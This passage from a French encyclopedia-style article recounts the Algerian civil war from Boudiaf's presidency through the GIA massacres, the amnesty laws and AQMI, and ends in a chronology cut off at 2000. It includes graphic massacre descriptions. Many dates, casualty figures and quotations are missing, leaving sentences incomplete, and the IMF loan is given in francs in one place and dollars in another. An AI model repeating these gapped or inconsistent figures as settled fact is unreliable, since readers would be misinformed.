Alors qu'il est au pouvoir, Boudiaf se concentre sur trois objectifs. Le premier est d'ordre économique, il s'agit de remettre à flot l'économie algérienne. En effet, avec une dette de 25 milliards de dollars, une croissance économique négative et un fort taux de chômage, l'économie algérienne est en grande difficulté. Or Boudiaf est persuadé que la situation économique délétère est le lit de la montée de l'islamisme et du FIS. Il est donc primordial pour le HCE de relancer au plus vite l'économie nationale. En plus de l'économie, le régime a pour second objectif de réorganiser la classe politique algérienne. Boudiaf entend exclure tout parti politique islamiste, au premier rang duquel le FIS, en renforçant l'article de la Constitution qui interdit tout parti politique dont la base idéologique est religieuse. De la même manière, il entend aussi reconquérir l'électorat ayant voté pour le FIS. D'autre part, Il semble nécessaire à Boudiaf de renforcer le régime en légitimant le HCE et le coup d’État de janvier, tous deux rejetés par les trois partis les plus importants sur l'échiquier politique algérien : Le Front des Forces Socialistes (FFS), le FIS et le FLN. Boudiaf tente donc d'attirer dans son gouvernement des membres de chacun de ces partis. De cette manière, des membres modérés du FIS ont obtenu des ministères, ainsi qu'un membre du parti des forces socialistes. Enfin, comme pour accélérer le processus de modernisation, Boudiaf veut créer une organisation populaire comme cadre pour discuter des difficultés rencontrées par le pays, mais aussi comme plateforme de soutien au régime et au HCE. Cette organisation sera créée dès mai 1992 sous le nom de Rassemblement patriotique national. Enfin, le troisième objectif fondamental de la présidence de Boudiaf est le rétablissement de l'ordre et la sécurité pour les Algériens. Pour cela, de nombreux membres du FIS furent arrêtés : d'après les rapports de l'armée, (incluant Abdelkader Hachani) selon le FIS et selon les chiffres avancés par Gilles Kepel. Les prisons étant insuffisantes pour emprisonner tout le monde, des camps furent créés au Sahara, et les hommes qui portaient une barbe craignirent de sortir dans la rue de peur d'être arrêtés en tant que sympathisants du FIS. L’état d'urgence fut déclaré, et beaucoup de droits constitutionnels suspendus. Toutes les protestations furent étouffées. Des organisations de défense des droits de l'homme, comme Amnesty International, signalèrent l'utilisation fréquente de la torture par le gouvernement et la détention de suspects sans charges ni procès. Le gouvernement a officiellement dissous le FIS le 4 mars, alors que l'armée concentrait le pouvoir réel malgré les efforts de Boudiaf.
Début de la guerre, 1992-1993.
Les quelques activistes du FIS restés en liberté prirent ces événements comme une déclaration de guerre. Dans la majeure partie du pays, les activistes restants du FIS, ainsi que certains islamistes plus radicaux que le FIS, prirent le maquis avec des armes de fortune. Leurs premières attaques contre les forces de sécurité commencèrent à peine une semaine après le coup d'État, et les soldats et les policiers furent rapidement pris pour cibles. Comme dans les guerres précédentes, les combattants furent presque exclusivement basés dans les montagnes du Nord de l'Algérie, où la forêt et le maquis sont bien adaptés à la guérilla, mais aussi dans certains secteurs urbains ; le Sahara, riche en pétrole et en gaz, mais très peu peuplé resta paisible pendant presque tout le conflit. La principale source de devise du gouvernement fut ainsi en grande partie épargnée.
La situation tendue fut aggravée par l’effondrement de l'économie cette année-là, à tel point que les aides alimentaires furent suspendues. Les espoirs placés par la population dans la personne apparemment intacte de Mohammed Boudiaf furent bientôt déçus quand il fut victime en juin d'un attentat d'un de ses propres gardes du corps. Le , l'un de ses gardes du corps, le lieutenant Lambarek Boumaarafi, assassine Mohamed Boudiaf alors qu'il faisait un discours. Les raisons de son assassinat sont encore floues, mais sa lutte contre la corruption au sein du régime, ou son refus de « jouer le rôle porte-parole » pour les acteurs du coup d'état de janvier, ont probablement joué dans la décision de son assassinat.
Le 26 août, il devint évident que la guérilla visait autant les civils que les représentants de l'État : l'attentat de l'aéroport d'Alger fit 9 morts et 128 blessés. Le FIS condamna l'attentat comme le firent les principaux autres partis, mais l'influence du FIS sur les guérilleros se révéla limitée.
Le MIA était une résurgence d'un mouvement du même nom, celui de Mustafa Bouyali, éliminé par l'armée en 1987. . Soucieux de contrôler les noyaux armés islamistes en gestation, les chefs du DRS avaient en effet décidé de les infiltrer. Cette politique conduira, avec le développement de la guerre civile, à des manipulations de grande ampleur de la violence perpétrée « au nom de l'islam ».
Dès 1991, le MIA a été équipé par le DRS de véhicules de service ; le DRS rédigeait, imprimait et distribuait lui-même certains tracts ; il aurait également constitué des listes noires (d’intellectuels à abattre) au Centre Ghermoul, siège de la Direction du contre-espionnage (DCE).
Les premiers combats semblent avoir été menés par le petit groupe extrémiste Takfir wal Hijra et des anciens combattants d’Afghanistan. Ces derniers constituent le fer de lance de la violence terroriste. Cependant, le premier mouvement armé important à émerger fut le mouvement islamique armé (MIA), juste après le coup d'État. Il était dirigé par l'ex-militaire Abdelkader Chebouti, un islamiste de longue date qui avait gardé ses distances avec le FIS pendant le processus électoral. En , un ex-soldat, ex-combattant en Afghanistan et ancien responsable de la sécurité au FIS, Said Mekhloufi fonda le Mouvement pour un État islamique (MEI) qui, lui, n'était pas encore infiltré par le DRS. Les divers groupes organisèrent plusieurs réunions pour essayer d'unir leurs forces, acceptant le principe d'un rassemblement autour de Chebouti. Le septembre, il dénonça le manque de discipline et l’attaque de l’aéroport d’Alger, qui pouvait éloigner des soutiens. Alors que Takfir wal Hijra et les Afghans de Noureddine Seddiki rejoignaient le MIA, les forces de sécurité donnèrent l’assaut. Les soupçons nés de cette attaque empêchèrent toute réunion ultérieure.
Le FIS lui-même organise un réseau clandestin, avec des journaux et même une radio liée au MIA, et vers la fin de 1992, il commence à diffuser depuis l'étranger des rapports officiels. Cependant, l'avis des mouvements de guérilla sur le FIS à cette époque est mitigé ; une grande partie soutient le FIS, une minorité significative, menée par les « Afghans », considère l'activité politique du parti comme non islamique, et rejeta donc les rapports avec le FIS.
En janvier 1993, Abdelhak Layada déclare que son groupe est indépendant de celui de Chebouti. La nouvelle faction devient le Groupe islamique armé (GIA). Elle fut particulièrement active à Alger, dans sa banlieue et dans les zones urbaines. Elle prit une position dure, s'opposant au gouvernement et au FIS, déclarant et publiant des menaces de mort contre plusieurs chefs du FIS et du MIA. Elle était nettement moins sélective que le MIA, qui insistait sur la formation idéologique ; en conséquence, elle a régulièrement été infiltrée par les forces de sécurité, provoquant un renouvellement fréquent au fur et à mesure que les dirigeants étaient abattus.
En 1993, la division entre les mouvements de guérilla devint plus claire. Le MIA et le MEI, concentrés dans le « maquis », essayèrent de développer une stratégie militaire contre l'État, visant plus particulièrement les services de sécurité et sabotant ou bombardant les établissements d'État. Depuis sa création, le GIA était concentré dans les secteurs urbains, préconisait et appliquait le massacre envers ceux qui soutenaient le pouvoir, y compris les employés de l'État, comme les professeurs et les fonctionnaires. Il assassina des journalistes et des intellectuels (comme Tahar Djaout), disant que . Il intensifia ses attaques en visant les civils qui refusaient de respecter ses interdictions, puis il commença à massacrer des étrangers, fixant un ultimatum d'un mois avant leur départ . Après quelques massacres, pratiquement tous les étrangers quittèrent le pays ; l'émigration algérienne (souvent illégale) augmenta aussi sensiblement, car les gens cherchaient une issue au conflit. Durant la même période, le nombre de visas accordés aux Algériens par les autres pays chuta.
Montée en puissance de la lutte antiterroriste.
Au moment du coup d'État, les autorités militaires décident d’engager l'armée seule pour lutter contre les maquis islamistes qui commencent à se constituer sur l’ensemble du territoire national. sont engagés contre les groupes armés. Mais les militaires, influencés par le modèle soviétique d'armée de masse peu flexible, subissent de lourdes pertes dans les mois suivant le putsch. Cette situation oblige les autorités à engager progressivement les autres composantes des forces de sécurité de l'État. La gendarmerie entame les premières opérations contre les maquisards en et la police (DGSN) est elle aussi intégrée dans la lutte antiterroriste à partir de 1993. Au total, sont engagés contre les Groupes Islamistes Armés.
Jusqu'à la fin de l'année 1994, les forces de sécurité sont dépassées par les nombreuses actions de guérilla menées par les groupes armés. La désertion massive de membres des forces de sécurité et l'impréparation de l'État à une guérilla bien implantée au sein de la population cause de nombreuses pertes dans les rangs de l’armée, la police et la gendarmerie.
À partir de cette date, les autorités militaires décident de la création de milices populaires pour épauler les forces de sécurité et couper les groupes armés de leur assise populaire. L'ensemble des effectifs engagée par l'État algérien dans la lutte anti-terroristes atteint en 1996.
Échec des négociations et luttes intestines, 1994.
La violence continua au cours de l'année 1994, bien que l'économie dans le même temps ait commencé à se redresser. Les négociations avec le FMI avaient permis de rééchelonner le remboursement de la dette ; le gouvernement obtint aussi un prêt de 40 milliards de francs de la communauté internationale pour libéraliser son économie. Comme il devenait évident que les troubles continueraient pendant un certain temps, le général Liamine Zéroual fut nommé nouveau président du Haut Conseil d'État ; il avait la réputation d’être plus un homme de dialogue qu'un membre des "éradicateurs" de l'armée. Peu après sa prise de fonction, il entreprit des négociations avec les dirigeants du FIS emprisonnés, libérant certains prisonniers en signe de bonne volonté. Les entretiens ont divisé la scène politique les grands partis politiques, en particulier le FLN et le FFS (kabyle et socialiste), continuèrent à réclamer un compromis, à l'inverse d'autres, notamment, l'Union générale des travailleurs algériens (UGTA), sans oublier des groupes de gauche ou féministes tels que le laïque RCD proche des "éradicateurs". Quelques mouvements paramilitaires vaguement pro-gouvernementaux, tels que l'Organisation des jeunes Algériens libres (OJAL), émergèrent et commencèrent à s'attaquer aux défenseurs civils de l'islamisme. Le , plus de mille prisonniers (principalement des islamistes) s'évadèrent de la prison de Tazoult, représentant pour la guérilla un succès ; plus tard, les partisans de la théorie de la conspiration suggérèrent qu'il s'agissait d'une mise en scène pour permettre aux forces de sécurité d'infiltrer le GIA.
En attendant, sous la direction de Cherif Gousmi (son chef depuis mars), le GIA devint le groupe le plus en vue en 1994. En mai, le FIS souffrit un coup apparent quand plusieurs de ses chefs qui n'avaient pas été emprisonnés, avec Said Makhloufi du MEI, rejoignirent le GIA. Comme le GIA avait publié des menaces de mort contre eux en , cela surprit beaucoup d'observateurs, qui l'interprétèrent comme le résultat des luttes intestines au FIS ou comme une tentative de réorienter le GIA. Le 26 août, le GIA déclara même un califat, ou gouvernement islamique, pour l'Algérie, avec Gousmi comme « Commandeur des croyants ». Dès le lendemain, Mekhloufi annonça son retrait du GIA, déclarant que le GIA avait dévié de l'islam et que ce califat était une tentative de l'ex-chef du FIS Mohammed Said pour contrôler le GIA. Celui-ci continua des attaques sur ses cibles habituelles, assassinant notamment des artistes, comme Cheb Hasni, et menaçant en août les écoles insuffisamment islamistes d'incendie criminel.
Les guérillas fidèles au FIS, menacées de marginalisation, essayèrent d'unir leurs forces. En , le MIA, ainsi que le reste du MEI et divers petits groupes, s'unirent sous le nom d’Armée islamique du salut (un terme qui avait été parfois employé par la guérilla favorable au FIS), déclarant leur allégeance au FIS et renforçant de ce fait le FIS dans les négociations. Vers la fin de 1994, elles contrôlaient plus de la moitié de la guérilla à l'est et à l'ouest, mais à peine 20 % au centre, près de la capitale, qui était l'implantation principale du GIA. Elles publièrent des communiqués condamnant les attentats aveugles du GIA contre les femmes, les journalistes et d'autres civils « non impliqués dans la répression », et attaquèrent la campagne d'incendie criminel des écoles par le GIA.
Fin octobre, le gouvernement annonça l'échec de ses négociations avec le FIS. Zéroual proposa en remplacement un nouveau plan : il programma une élection présidentielle pour 1995, tout en favorisant des « éradicateurs » de l'armée comme Lamari et organisant des « milices d'autodéfense » dans les villages pour combattre la guérilla. La fin 1994 fut marquée par une croissance notable de la violence. Au cours de 1994, l'isolement de l'Algérie se renforça ; la plupart des agences de presse étrangère quittèrent le pays cette année-là, alors que la frontière marocaine se fermait et que les lignes aériennes étrangères étaient interrompues. Le manque de couverture des événements par la presse étrangère et algérienne est encore aggravé en juin par le gouvernement qui interdit aux médias algériens de mentionner toute nouvelle en rapport avec le terrorisme non traitée par les communiqués de presse officiels.
Quelques chefs du FIS, notamment Rabah Kebir, s'exilèrent à l'étranger. À l'invitation de la Communauté de Sant'Egidio basé à Rome, en , ils entamèrent des négociations avec tous les autres partis d'opposition, islamiques ou pas (LADDH, FLN, FFS, FIS, MDA, PT, JMC). Ils conclurent un accord mutuel le : la plate-forme de Sant'Egidio. Elle regroupe un ensemble de principes :
À la surprise de beaucoup, même Ali Belhadj approuva l'accord, ce qui signifiait que le FIS retournait dans la légalité, d'un commun accord avec les autres partis d'opposition. Cependant, un signataire crucial était absent : le gouvernement lui-même. En conséquence, la plateforme eut peu d'effets immédiats. Les mois suivants furent marqués par le massacre d'environ 100 prisonniers islamistes dans la révolte de la prison de Serkadji, et d'un succès important pour les forces de sécurité lors de la Ain Defla, provoquant la mort de centaines d’islamistes.
En fin de compte, cependant, selon Andrea Riccardi qui mena les négociations pour la Communauté Sant'Egidio, : l'élection présidentielle de 1995.
Cherif Gousmi fut remplacé à la tête du GIA par Djamel Zitouni. Zitouni étendit les attaques du GIA aux civils sur le sol français, à commencer par le détournement du vol Air France 8969 à la fin , puis plusieurs attentats à la bombe au cours de l'année 1995. En Algérie même, il continua les plasticages de voiture et les assassinats de musiciens, de sportifs, et des femmes non voilées, aussi bien que les cibles habituelles. On pouvait alors s'interroger sur la nature apparemment contre-productive de plusieurs de ses attaques et émettre l'hypothèse (encouragée par des membres du FIS à l'étranger) que le groupe avait été infiltré par les services secrets algériens. La région au sud d'Alger, en particulier, fut dominée par le GIA, qui l'appela « la zone libérée », avant d'être appelée le « triangle de la mort ».
Les communiqués de guerre entre l'AIS et le GIA proliférèrent, et le GIA réitéra ses menaces de mort contre des chefs du FIS et de l'AIS, assassinant un cofondateur du FIS, Abdelbaki Sahraoui, à Paris. Des sources étrangères estimèrent alors qu'il y avait environ .
Poursuite de l'expression politique, émergence des milices, 1995-96.
À la suite de l'arrêt des négociations avec le FIS, le gouvernement décida d'organiser une élection présidentielle. Le , Liamine Zéroual fut élu président avec 60 % des voix. L'élection fut contestée par beaucoup de candidats, y compris par les islamistes Mahfoud Nahnah (25 %) et Noureddine Boukrouh (moins de 4 %) et le tenant de la laïcité Said Sadi (10 %), mais à l'exception du FIS, tous constatèrent un fort taux de participation (officiellement 75 %, taux confirmé par la plupart des observateurs)en dépit de l'appel à l'abstention du FIS, du FFS et du FLN et les menaces de mort du GIA pour tous les votants (avec le slogan « une voix, une balle »). Un niveau élevé de sécurité fut maintenu pendant la période électorale jusqu'au jour de l'élection, par une mobilisation massive. Les observateurs étrangers de la ligue arabe, de l'ONU et des organisations de l'unité africaine n'exprimèrent aucune réserve fondamentale. Les élections furent généralement perçues par les étrangers comme tout à fait libres, et les résultats raisonnablement plausibles, étant donné le choix limité de candidats.
Les résultats reflétèrent les diverses opinions de la population, allant du soutien à la laïcité et l'opposition à l'islamisme à un désir d’arrêt des violences, indépendamment de la politique. L'espoir naquit que la politique algérienne s'apaise finalement. Zéroual en profita pour présenter une nouvelle constitution en 1996, qui renforçait nettement le pouvoir du président et en créant une deuxième assemblée, en partie élue et en partie nommée par le président. En , le texte fut soumis à un référendum national ; tandis que le taux officiel de participation était de 80 %, cette élection ne fut pas contrôlée, et le fort taux de participation fut considéré comme peu vraisemblable.
La politique du gouvernement fut combinée avec la création de la garde communale et des milices pro-gouvernementales. Ces « milices d'autodéfense », souvent appelées les « patriotes » pour faire court, se composant de citoyens locaux entraînés par l'armée et armés par le gouvernement, furent organisées dans les villes « sûres » et proches des zones d'activité des groupes de guérilla islamiste. Le programme fut plus ou moins bien accueilli suivant les régions du pays ; il fut sensiblement renforcé au fil des années, en particulier après les massacres de 1997.
Les élections furent un revers pour les groupes armés, qui enregistrèrent une augmentation significative des désertions juste après les élections. Rabah Kebir du FIS répondit aux modifications dans l'opinion populaire en adoptant une tonalité plus conciliante vis-à-vis du gouvernement, mais cette évolution fut condamnée par une partie du Front et par l'AIS. Le GIA fut secoué par des dissensions internes ; peu de temps après l'élection, sa direction tua les chefs du FIS qui avaient rejoint le GIA, les accusant de tenter une récupération. Cette purge accéléra la désintégration du GIA : les factions de Mustapha Kartali, Ali Benhadjar et Hassan Hattab refusèrent de reconnaître l'autorité de Zitouni vers la fin 1995, bien qu'ils n'aient formellement fait sécession que bien plus tard. En décembre, le GIA tua le chef de l'AIS pour l'Algérie centrale, Azzedine Baa, et en janvier s'engagea à combattre l'AIS comme un ennemi ; en particulier dans l'ouest, la guerre entre les deux mouvements fut totale.
Massacres et réconciliation, 1996-1997.
En , le chef du GIA Djamel Zitouni fut assassiné par une ex-faction du GIA et Antar Zouabri lui succéda, se révélant encore plus sanglant.
Les élections législatives se déroulèrent le . Elles furent dominées par le Rassemblement national démocratique (RND), un nouveau parti créé en par les partisans de Zéroual, qui obtint 156 sièges sur 380, suivi par le MSP (après le changement de nom du Hamas) et le FLN avec plus de 60 sièges chacun. Les analyses de cette élection furent partagées ; la plupart des principaux partis d'opposition se plaignirent, et le succès du tout nouveau RND surprit tout le monde. Le RND, le FLN et le MSP formèrent un gouvernement de coalition, avec Ahmed Ouyahia du RND comme premier ministre. Il y eut des mesures d'assouplissement envers le FIS : Abdelkader Hachani fut libéré, et Abbassi Madani assigné à résidence.
C'est à cette époque qu'apparut un nouveau problème. Au cours du mois d'avril, l'Algérie subit des massacres d'une brutalité et d'une ampleur sans précédent (voir le massacre de Thalit) ; d'autres massacres avaient été commis au cours du conflit, mais toujours à une échelle nettement moindre. Visant particulièrement les villages ou les banlieues sans distinction d'âge et de sexe des victimes, les partisans du GIA tuèrent des dizaines, et parfois même des centaines de civils à la fois. Ces massacres se poursuivirent jusqu'à la fin 1998, modifiant notablement la situation politique. Le sud et l'est d'Alger, qui avait voté pour le FIS en 1991, furent particulièrement frappés ; les massacres de Rais et de Bentalha choquèrent en particulier les observateurs internationaux. Le matin du 29 aout 1997, le massacre de Rais fait entre : hommes, femmes et enfants ont été massacrés à l’arme blanche (couteaux, haches) ou brûlés. Des femmes enceintes furent éventrées et découpées en tranches, des enfants furent taillés en morceaux ou jetés contre des murs, les membres des hommes furent coupés, et dans leur retraite les attaquants enlevèrent des jeunes femmes pour en faire des esclaves sexuelles. Ce massacre a été suivi par d’autres massacres à Beni Messous et à Bentalha à quelques kilomètres au nord de Sidi Moussa le avec la mort de 250 civils. D’autres massacres autour de Tiaret et Relizane entre et ont fait entre civils.
À la fin de l’année 1997, uniquement durant les deux premières semaines du Ramadan, plus de ont été tuées en Algérie.
Bien que cette citation attribuée à Nesroullah Yous, un survivant de Bentalha, soit peut-être une exagération, elle exprime l'humeur apparente des attaquants :
La responsabilité du GIA dans ces massacres est incontestable. Il revendiqua les massacres de Rais et Bentalha, les qualifiant et les victimes de défenseurs « impies » des tyrans dans un communiqué de presse. Cette politique de massacres de civils fut l'une des principales raisons de la scission du Groupe salafiste pour la prédication et le combat (GSPC). À ce stade, il avait apparemment adopté l"'idéologie" takfiriste, selon laquelle tous les Algériens ne combattant pas activement le gouvernement étaient corrompus au point d'être des "kafirs", et pouvaient être tués « légalement » en toute impunité ; un communiqué non confirmé de Zouabri déclarait qu'. Certains pensent que le motif de la destruction d'un village venait de l'adhésion de celui-ci au programme gouvernemental, qu'il vit comme une preuve de déloyauté ; pour d'autres, la rivalité avec d'autres groupes (par exemple, la faction détachée de Mustapha Kartali) joua un rôle.
C'est à cette époque que l'AIS engagea une guerre totale, tant avec le GIA qu’avec le gouvernement, se trouvant dans une position intenable. Le GIA apparut comme un ennemi plus immédiat, et les membres de l'AIS craignirent que les massacres, qu'ils avaient régulièrement condamnés, leur soient imputés. Le , le dirigeant de l'AIS, Madani Mezrag, ordonna le cessez-le-feu unilatéral et sans condition débutant le , L'AIS s'est mis en grande partie hors de la scène politique, ramenant le combat à une lutte entre le gouvernement, le GIA, et les divers groupes qui quittaient petit à petit de l'orbite du GIA. La ligue islamique pour la Da'wa et le Jihad d'Ali Benhadjar (LIDD), formée en février 1997, s'allia à l'AIS et observa le même cessez-le-feu. Au cours des trois années suivantes, l'AIS négocia une amnistie graduelle pour ses membres.
Le GIA détruit, le GSPC continue, 1998-2000.
Après que de nombreuses pressions internationales se sont manifestées, l'Union européenne envoya deux délégations, l'une d'elles menée par Mário Soares, pour visiter l'Algérie et enquêter sur les massacres au premier semestre de 1998 ; leurs rapports condamnèrent les groupes islamistes armés.
Les villes devinrent plus sûres, bien que les massacres continuassent dans des secteurs ruraux. La politique de massacres des civils du GIA avait déjà creusé un fossé parmi ses dirigeants, certains la rejetant ; le , ce désaccord fut formalisé avec la formation du Groupe salafiste pour la prédication et le combat (GSPC), basé dans les montagnes à l'ouest de la Kabylie et mené par Hassan Hattab.
Le 11 septembre, Zéroual surprit les observateurs en annonçant sa démission. Une nouvelle élection fut organisée, et le , l'ex-combattant pour l'indépendance Abdelaziz Bouteflika soutenu par l'armée, fut élu président avec, selon les autorités, 74 % des voix. Tous les autres candidats s'étant retirés de l'élection peu avant, mentionnant la crainte de fraudes. Bouteflika poursuivit les négociations avec l'AIS, et le 5 juin l'AIS accepta le principe de sa dissolution. Bouteflika accompagna ce succès d'une amnistie du gouvernement d'un certain nombre d'islamistes prisonniers condamnés pour des actes mineurs et en soumettant la loi d'harmonie civile au parlement, une loi désignée sous le nom de la « Concorde civile » permettant à des combattants islamistes non coupables de meurtre ou de viol d'échapper à toute poursuite s'ils se rendaient. Cette loi fut finalement approuvée par référendum le , et un certain nombre de combattants, y compris Mustapha Kartali, en profitèrent pour reprendre une vie normale provoquant la colère de ceux qui avaient été victimes des islamistes. La direction du FIS exprima son mécontentement vis-à-vis des résultats, estimant que l'AIS arrêtait le combat sans avoir résolu aucun problème ; mais leur principal porte-parole hors de prison, Abdelkader Hachani, fut assassiné le 22 novembre. La violence diminua, sans toutefois disparaître totalement, et le calme revint en Algérie.
L'AIS fut entièrement dissoute le , ayant négocié une amnistie spéciale avec le gouvernement. Le GIA, déchiré par les dissensions et les abandons et dénoncé de tous les côtés et même par le mouvement islamiste, fut lentement détruit par des opérations militaires au cours des années suivantes ; à la mort d'Antar Zouabri le , il était incapable de poursuivre son action. Les efforts du gouvernement furent davantage soutenus au lendemain des attentats du 11 septembre 2001 ; les États-Unis manifestèrent leur soutien envers le gouvernement algérien, en gelant les avoirs du GIA et du GSPC et en fournissant des lunettes infrarouges à l'armée.
Avec le déclin du GIA, le GSPC subsistait en tant que groupe rebelle le plus actif, avec environ 300 combattants en 2003. Il continua une campagne de tueries de policiers et de militaires dans son secteur, parvenant même à progresser au Sahara, où sa division, menée par Amari Saifi (surnommé « Abderrezak el-Para »), enleva des touristes allemands en 2003, avant d'être forcé de fuir dans des secteurs dépeuplés du Mali, et plus tard au Niger et au Tchad, où il fut capturé. À la fin 2003, le fondateur du groupe fut supplanté par l'encore plus radical Nabil Sahraoui, lequel annonça son soutien à Al-Qaïda, renforçant les liens des gouvernements des États-Unis et d'Algérie. Il aurait été tué peu de temps après.
La libération des chefs du FIS Madani et Belhadj en 2003 n'a eu aucun effet visible sur la situation, illustrant une confiance gouvernementale retrouvée qui fut confirmée par l'élection présidentielle de 2004, dans laquelle Bouteflika fut réélu avec 85 % des voix et l'appui des deux principaux partis. L'élection fut analysée comme la confirmation du soutien populaire fort à la politique de Bouteflika envers les terroristes et la réussite de l'arrêt des violences à grande échelle.
En , un référendum proposant l'amnistie fut soumis par le gouvernement de Bouteflika, comme la loi de 1999, pour mettre un terme aux poursuites pour les personnes qui n'avaient plus d'activités militaires et pour offrir des compensations aux familles des personnes tuées par les forces gouvernementales. La proposition fut acceptée par 97 % des votants. Ces résultats restent mitigés.
Les lois de "réconciliation nationale" et de "consolidation de la paix" jouissent d’un soutien populaire relativement moindre malgré les résultats au référendum de . C’est la loi d’amnistie de 2006 qui marque le point focal d’impossibilité de tenir responsable quiconque pour l’ensemble des crimes ayant eu lieu durant cette décennie. Cette loi qui à la base excluait les personnes ayant commis des meurtres ou des viols, a été étendue à l’ensemble des personnes ayant commis un crime durant cette période, ce qui a entrainé la colère populaire ainsi que cette impossibilité de désigner des responsables.
De nombreuses associations civiles contestent ces lois, particulièrement des associations de familles ayant perdu des proches ou ayant des proches disparus. Ali Merabet, représentant de l'association Somoud, qui lutte pour une justice envers les victimes et les familles des victimes du terrorisme durant cette décennie et dont les deux frères ont été tués par un groupe armé en 1995 énonce après la promulgation de la loi d’amnistie en 2006 : « Pour moi le problème n’était pas l’État, mais le terroriste, l’islamiste qui était mon voisin à qui je n’ai jamais fait de mal mais qui m’en a fait. Mais on a réalisé avec cette loi, que l’État et les terroristes ont fait un deal entre eux… Si la personne responsable du meurtre de mes frères est protégée par l’État qui est le vrai agresseur ? ».
En 2006, Abdelmalek Droukdal, alias Abou Moussab Abd El-Ouadoud, le du GSPC algérien, sous le parrainage d’Abou Moussab El-Zarqaoui, fait allégeance à Al-Qaïda. Le GSPC devient Al-Qaida au Maghreb islamique (AQMI). L'organisation va perpétrer plusieurs attentats spectaculaires dont plusieurs en ayant recours aux kamikazes ( et ). On lui attribue aussi des attentats et des prises d'otage au Sahel, notamment l'exécution de 11 gendarmes à Tinzaoutine le et celle de Michel Germaneau (revendiquée) le au Mali.
Le bilan mensuel des violences en 2010 atteint entre . Un bilan de l'OTAN tiré de sources publiques annonce, en 2011, 105 attaques terroristes causant 159 tués, 191 blessés et 9 enlevés.
Depuis l'amnistie de 2005, les services de sécurité ont arrêté jusqu’à , tandis que , dont 81 émirs, à leur tête Hassan Hattab, se sont rendus et ont bénéficié de la cessation de l’action publique.
Le succès de la stratégie gouvernementale pendant la décennie noire s’explique par le fait que l'armée, bien que non préparée au combat de guérilla et en partie infiltrée par les islamistes, ait su garder son unité et son objectif de défense du territoire, face à la diversité des mouvements armés islamistes, aux objectifs et moyens divergents, se combattant parfois entre eux. Ainsi, l'armée, étant restée solidaire et unie face aux menaces des islamistes, a empêché l'effondrement de l'État.
Chronologie.
1991.
Le Front islamique du salut gagne largement le premier tour des élections législatives en Algérie. Une partie de la société civile exprime publiquement son inquiétude. Une partie des généraux dits « janviéristes » de l'armée prépare une prise de pouvoir des militaires en cas de victoire du FIS au second tour prévu en 1992. Le président Chadli Bendjedid décrète l'état de siège en juin devant les démonstrations de force du FIS. Les premiers attentats contre les forces de sécurité apparaissent.
1992.
Les généraux organisent un putsch et s'emparent du pouvoir le . L'armée se déploie dans les rues d'Alger. La constitution de 1989 est déclarée illégale, le parlement dissous et le président contraint à la démission. Un Haut Comité d'État est constitué par les généraux putschistes pour remplacer le pouvoir politique alors vacant. L'opposant Mohamed Boudiaf est nommé président du HCE. Il sera assassiné la même année. Le FIS est dissous par l'armée et ses militants pourchassés et emprisonnés dans des centres de détention établis dans le Sud saharien. Les dirigeants du FIS sont arrêtés. Les premiers maquis se constituent. Création du « Groupe islamique armé » (GIA). Premiers attentats contre des intellectuels. Les attentats se multiplient contre les forces de sécurité. En septembre un militant syndicaliste universitaire est assassiné à Constantine.
Le , le couvre-feu, de 22h30 à 5 heures du matin est décrété dans sept wilayas : Alger, Tipaza, Boumerdès, Blida, Médéa, Aïn Defla, Bouira.
1993.
L'assassinat de personnalité connues, intellectuels, journalistes, citoyens militants s'accentue. L'armée organise de nombreuses opérations de ratissage dans les maquis au nord du pays. Les pouvoirs de la justice et des forces de l'ordre sont renforcés dans le cadre de la lutte antiterroriste. Premiers assassinats de personnalités civiles. Premières attaques du GIA contre les étrangers en fin d'année.
1994.
Les étrangers (journalistes, ambassades…) quittent en masse le pays après les nombreuses menaces et attentats à leur encontre. Les attaques redoublent d’intensité contre les infrastructures économiques, de communication et de transport du pays. Premiers attentats contre la population civile. De nombreux membres des forces de sécurité sont tués ou ont déserté. Les défaites successives des militaires face aux groupes armés obligent l'État à abandonner de nombreux territoires aux forces non conventionnelles. Attentat du GIA contre un avion Airbus d'Air France. Le FIS (parti islamiste dissous) crée l'« Armée islamique du salut » (AIS), destinée à la lutte armée contre l'État algérien. L'Algérie accepte le plan de restructuration du FMI et reçoit un prêt de 40 milliards de dollars. Une lettre de Ali Benhadj, alors en résidence surveillée, est diffusée dans la presse, il prête allégeance au chef du GIA en promettant qu'une fois libre, il rejoindrait le maquis.
Le général Liamine Zéroual est désigné président du Haut Comité d'État par les généraux janviéristes.
1995.
Attentats très meurtriers contre les forces de l'ordre et les civils. L'armée rappelle et lance des contre-offensives victorieuses contre les groupes armés, réoccupant progressivement le terrain perdu depuis 2 ans. Premières constitutions de « milices civiles » contre les islamistes. Le succès international de la plate-forme de Sant'Egidio (accord de l’ensemble des partis politiques, dont le FIS, sur la paix civile en Algérie) oblige les militaires à organiser une élection présidentielle en novembre. L'armée mobilise alors pour garantir la sécurité des bureaux de vote. Le général Zeroual est élu avec 61 % des voix. La France est touchée en fin d'année par plusieurs attentats commandités par le GIA.
Premières négociations entre le FIS et le président-général Liamine Zeroual.
1996.
Le président Zeroual fait promulguer une nouvelle constitution renforçant considérablement les pouvoirs présidentiels. Premiers massacres de masse contre les civils, revendiqués par le GIA. Assassinat des moines de Tibhirine en mars, puis de l'évêque d'Oran Pierre Claverie avec son chauffeur Mohamed Bouchikhi le . L'armée mobilise pour reprendre le contrôle d’Alger et de sa région. Les attaques ne cessent pas pour autant.
 sont engagés contre les maquis. 20 % des dépenses de l’État sont consacrées à la lutte contre le terrorisme.
1997.
L'année 1997 est la plus meurtrière pour la population civile, victime de véritables campagnes de massacres par les groupes armés, dont le GIA. Plusieurs centaines de personnes (femmes, enfants, personnes agées, familles…) sont assassinées à chaque tuerie. Face à ces massacres, l'Armée islamique du salut annonce une trêve sans conditions avec le gouvernement algérien (trêve à laquelle le FIS est opposé).
Le pouvoir organise des élections législatives en juin, largement remportés par le Rassemblement national démocratique, parti de l'armée.
1998.
Échec des négociations entre le président algérien et le Front islamique du salut dissous. Démission forcée de Liamine Zéroual. Annonce d'élections présidentielles pour 1999. Les massacres continuent contre la population.
1999.
Élection d'Abdelaziz Bouteflika à la tête du pays. L'AIS annonce qu'elle dépose définitivement les armes. Après de longues négociations avec l'Armée nationale populaire (Algérie) pendant le mandat de Liamine Zéroual, un projet de loi de « concorde civile », approuvé par référendum en 1999. Amnistie générale des combattants acceptant de déposer les armes. Fin progressive des violences.
La guerre a coûté plus de 20 milliards de dollars à l'État algérien.
Les premiers bilans humains de ces sept années de conflit indiquent que la guerre a fait près de et disparus. L'État a payé aussi un lourd tribut avec plus de tués et des dizaines de milliers blessés.
2000.
